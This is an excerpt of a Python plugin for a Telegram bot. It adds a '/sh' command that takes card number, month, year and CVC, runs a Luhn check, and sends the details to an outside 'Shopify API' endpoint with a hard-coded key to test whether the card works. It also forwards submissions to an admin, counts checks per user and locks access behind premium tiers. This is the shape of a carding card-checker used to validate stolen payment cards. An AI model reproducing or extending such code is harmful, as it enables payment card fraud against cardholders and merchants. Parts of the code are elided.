...
PLUGIN_INFO = {
    ...
    'commands': ['sh'], # Changed command to 'sh' for Shopify
    'prefixes': ['.', '/', '!', '$'],
    'description': 'Shopify API payment gateway',
    'type': 'check',
    'status': 'active'
}

def categorize_shopify_response(api_response):
    """Categorize Shopify API response"""
    try:
...
def format_shopify_response(card_info, response_message, suffix, bin_info, execution_time, category):
    """Format Shopify API response for Telegram"""
    ...
    response_text += f"㊕ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Shopify API\n"
...
class ShopifyGateway:
    def __init__(self):
        self.base_url = "https://onyxenvbot.up.railway.app/shopify/key=yashikaaa/cc="

    async def check_card(self, card, month, year, cvv):
        """Main function to check card through Shopify API"""
...
def setup(app: Client):
    ...
    async def sh_command(client, message):
        ...
        can_access, reason = await check_gateway_access(user_id, 'sh')
        if not can_access:
            if reason == "locked":
                return
            elif reason == "premium":
        ...
        if not text:
            resp = f"""〈<a href='tg://user?id={user_id}'>꫟</a>〉-» 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗔𝗣𝗜 - CHECK

〈♻️〉𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» Shopify API

<a href='tg://user?id={user_id}'>╰┈➤</a> 𝙁𝙤𝙧𝙢𝙖𝙩 -» /sh cc|month|year|cvc"""
        ...
        if not await validate_card_with_luhn(card_info, "Shopify API", message):
            return
        
        card, month, year, cvv = card_info
        
        # Forward to admin if enabled
        await forward_to_admin_if_enabled(client, message, 'sh')
        
        # Send progress message
        progress_msg = await message.reply_text("𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩...")
        
        # Process the card using Shopify Gateway
        gateway = ShopifyGateway()
        api_response, error, execution_time = await gateway.check_card(card, month, year, cvv)
        
        # Increment check counter
        db.increment_check(user_id, 'sh')
        ...
        if error:
            ...
            response_text = format_shopify_response(
            ...
            # Parse API response
            category, response_message, suffix = categorize_shopify_response(api_response)
    ...
    print("✅ Shopify Gateway commands registered")
